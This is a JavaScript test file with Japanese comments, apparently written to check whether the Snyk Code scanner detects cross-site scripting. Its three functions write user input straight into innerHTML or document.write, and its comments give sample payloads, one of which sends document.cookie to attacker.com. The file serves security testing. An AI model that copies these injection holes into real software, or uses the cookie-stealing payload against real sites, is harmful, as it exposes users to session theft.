// 検証用：XSS（クロスサイトスクリプティング）の例
// このファイルは Snyk Code の検出検証専用です。本番利用禁止。
// 危険な理由：ユーザー入力を innerHTML に直接代入すると、悪意あるスクリプトが実行される。

'use strict';

// ❌ 危険：ユーザー入力を innerHTML に直接代入
function renderUserContent(userInput) {
  // 攻撃例: userInput = "<img src=x onerror='alert(document.cookie)'>"
  document.getElementById('content').innerHTML = userInput;
}

// ❌ 危険：URLパラメータをそのまま表示
function renderFromUrl() {
  const urlParams = new URLSearchParams(window.location.search);
  const name = urlParams.get('name');
  // 攻撃例: ?name=<script>fetch('https://attacker.com?c='+document.cookie)</script>
  document.getElementById('greeting').innerHTML = '検索結果：' + name;
}

// ❌ 危険：document.write() でユーザー入力を出力
function writeUserData(data) {
  document.write('<div>' + data + '</div>');
}

module.exports = { renderUserContent, renderFromUrl, writeUserData };
